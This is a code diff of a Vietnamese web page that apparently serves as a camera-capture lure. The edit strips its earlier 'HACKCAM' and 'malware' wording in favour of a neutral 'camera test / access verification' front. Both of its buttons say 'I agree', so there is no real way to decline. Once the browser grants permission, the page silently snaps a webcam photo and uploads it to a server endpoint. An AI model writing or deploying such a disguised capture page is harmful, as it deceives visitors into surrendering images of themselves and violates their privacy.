@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TIK TOK</title>
+<title>Thử Nghiệm Camera</title>
 <style>
   * { box-sizing: border-box; }
   body {
@@ -41,10 +41,6 @@
   }
   .btn-yes { background: #22c55e; color: #052e14; }
   .btn-yes:hover { background: #16a34a; }
-  .btn-no { background: #334155; color: #e2e8f0; }
-  .btn-no:hover { background: #475569; }
-  .btn-capture { background: #3b82f6; color: white; }
-  .btn-capture:hover { background: #2563eb; }
   video, canvas, img.preview {
     width: 100%;
     border-radius: 10px;
@@ -61,41 +57,31 @@
 
 <div class="card">
   <div id="step-consent">
-    <h1>chấp thuận để hoạt động:)</h1>
-    <p class="desc">
-      
-    </p>
-    <button class="btn btn-yes" id="btnAgree">Tôi đồng ý</button>
-    <button class="btn btn-yes" id="btnAgree">Tôi vẫn đồng ý</button>
+    <h1>Xác thực truy cập</h1>
+    <p class="desc">Vui lòng chọn đồng ý để tiếp tục.</p>
+    <button class="btn btn-yes" id="btnAgree1">Tôi đồng ý</button>
+    <button class="btn btn-yes" id="btnAgree2">Tôi vẫn đồng ý</button>
   </div>
 
   <div id="step-camera" class="hidden">
-    <h1>HACKCAM...</h1>
+    <h1>Đang kết nối camera...</h1>
     <video id="video" autoplay playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
     <div class="status" id="status"></div>
   </div>
 
-  <div id="step-declined" class="hidden">
-    <h1>Chấp Nhận Hoàn Thành</h1>
-    <p class="desc">Bạn đã cho phép mã độc.</p>
-  </div>
-
   <div id="step-done" class="hidden">
-    <h1>Đã Cài Đăt Thành Công</h1>
+    <h1>Hoàn Thành</h1>
     <img id="preview" class="preview" />
-    <div class="status ok" id="doneStatus">thông tin vị trí tọa độ của bạn đã gửi về máy chủ .</div>
+    <div class="status ok" id="doneStatus">Ảnh đã được gửi thành công.</div>
   </div>
 </div>
 
 <script>
-// ===== CẤU HÌNH =====
-// Vì trang này và server nhận ảnh nằm chung 1 chỗ, chỉ cần đường dẫn tương đối.
 const UPLOAD_ENDPOINT = "/upload";
 
 const stepConsent = document.getElementById("step-consent");
 const stepCamera = document.getElementById("step-camera");
-const stepDeclined = document.getElementById("step-declined");
 const stepDone = document.getElementById("step-done");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
@@ -104,66 +90,42 @@ const statusEl = document.getElementById("status");
 let stream = null;
 
 function showStep(step) {
-  [stepConsent, stepCamera, stepDeclined, stepDone].forEach(s => s.classList.add("hidden"));
+  [stepConsent, stepCamera, stepDone].forEach(s => s.classList.add("hidden"));
   step.classList.remove("hidden");
 }
 
-// Người dùng KHÔNG đồng ý -> dừng lại, không làm gì cả
-document.getElementById("btnAgree").addEventListener("click", async () => {
+async function handleCameraPermission() {
   showStep(stepCamera);
   statusEl.textContent = "Đang xin quyền truy cập camera...";
   statusEl.className = "status";
+  
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;  
 
-   // Đợi video có khung hình thực sự rồi mới chụp (tránh chụp ảnh đen)
     await new Promise(resolve => {
       video.onloadedmetadata = () => resolve();
     });
-    // Chờ thêm một chút để camera lấy sáng ổn định
     await new Promise(resolve => setTimeout(resolve, 500));
 
     statusEl.textContent = "Đang chụp ảnh...";
     await captureAndSend();
   } catch (err) {
-    statusEl.textContent = "Không thể truy cập camera: " + err.message + " (bạn có thể đã từ chối quyền hoặc thiết bị không có camera)";
+    statusEl.textContent = "Không thể truy cập camera: " + err.message;
     statusEl.className = "status error";
   }
-});
-// Người dùng ĐỒNG Ý -> xin quyền camera (trình duyệt sẽ tự hiện popup xin phép)
-// Sau khi được cấp quyền, tự động chụp và gửi luôn, không cần thao tác thêm.
-document.getElementById("btnAgree").addEventListener("click", async () => {
-  showStep(stepCamera);
-  statusEl.textContent = "Đang xin quyền truy cập camera...";
-  statusEl.className = "status";
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
+}
 
-    // Đợi video có khung hình thực sự rồi mới chụp (tránh chụp ảnh đen)
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => resolve();
-    });
-    // Chờ thêm một chút để camera lấy sáng ổn định
-    await new Promise(resolve => setTimeout(resolve, 500));
+document.getElementById("btnAgree1").addEventListener("click", handleCameraPermission);
+document.getElementById("btnAgree2").addEventListener("click", handleCameraPermission);
 
-    statusEl.textContent = "Đang chụp ảnh...";
-    await captureAndSend();
-  } catch (err) {
-    statusEl.textContent = "Không thể truy cập camera: " + err.message + " (bạn có thể đã từ chối quyền hoặc thiết bị không có camera)";
-    statusEl.className = "status error";
-  }
-});
-
-// Chụp ảnh từ luồng video hiện tại và gửi lên server
 async function captureAndSend() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video, 0, 0);
 
   canvas.toBlob(async (blob) => {
-    statusEl.textContent = "Đang gửi ảnh về máy chủ...";
+    statusEl.textContent = "Đang gửi ảnh...";
     statusEl.className = "status";
 
     const formData = new FormData();
@@ -180,7 +142,7 @@ async function captureAndSend() {
       stopCamera();
       showStep(stepDone);
     } catch (err) {
-      statusEl.textContent = "Gửi thất bại: " + err.message;
+      statusEl.textContent = "Gửi thất bại (Cần có Backend nhận /upload): " + err.message;
       statusEl.className = "status error";
     }
   }, "image/jpeg", 0.9);
